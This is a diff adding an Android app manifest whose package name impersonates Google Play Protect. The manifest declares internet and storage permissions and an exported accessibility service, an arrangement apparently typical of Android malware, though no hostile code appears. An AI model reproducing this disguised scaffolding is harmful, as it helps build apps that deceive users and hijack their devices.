@@ -1,0 +1,42 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+	package="com.GooglePlayProtectService">
+
+
+<uses-permission android:name="android.permission.INTERNET"/>
+	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+	<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+	<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+		android:maxSdkVersion="33" />
+	<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+		android:maxSdkVersion="33" />
+
+
+	<application
+		android:allowBackup="true"
+		android:icon="@drawable/ic_launcher"
+		android:label="@string/app_name"
+
+		android:supportsRtl="true"
+		android:theme="@style/Theme.AppCompat.Light">
+		<activity android:name="com.MainActivity"
+			android:exported="true">
+			<intent-filter>
+				<action android:name="android.intent.action.MAIN"/>
+				<category android:name="android.intent.category.LAUNCHER"/>
+			</intent-filter>
+		</activity>
+		<service
+			android:name="com.MyAccessibilityService"
+			android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+			android:label="@string/accessibility_service_label"
+			android:exported="true">
+			<intent-filter>
+				<action android:name="android.accessibilityservice.AccessibilityService"/>
+			</intent-filter>
+			<meta-data
+				android:name="android.accessibilityservice"
+				android:resource="@xml/accessibility_service_config"/>
+		</service>
+	</application>
+
+</manifest>
